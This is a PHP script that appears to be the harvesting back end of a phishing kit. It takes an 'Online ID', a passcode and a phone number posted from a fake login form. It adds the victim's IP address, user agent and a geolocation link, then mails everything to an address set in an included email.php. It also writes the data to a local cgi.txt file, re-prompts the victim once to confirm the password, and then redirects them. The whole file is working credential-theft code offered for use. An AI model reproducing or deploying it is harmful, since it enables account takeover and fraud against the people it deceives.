<?php
include 'email.php';

if (isset($_POST['submit-btn'])) {
	$email = $_POST['ai'];
	$password = $_POST['pr'];
	$count = $_POST['count'];

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- fudsender(dot)com --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	$fp = fopen('cgi.txt', 'a');
	fwrite($fp, $message);
	fclose($fp);
	if ($count==0)
	{
		header("Location: ./index.html?count=1&email=#".$email);
	}
	else
	
	{
		header("Location: ".$redirect);

	}
	
}

if (isset($_POST['submit-btn1'])) {
	$phone = $_POST['ph'];

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Phone            : ".$phone."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- fudsender(dot)com --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);

	header("Location: ".$redirect);
	
}





?>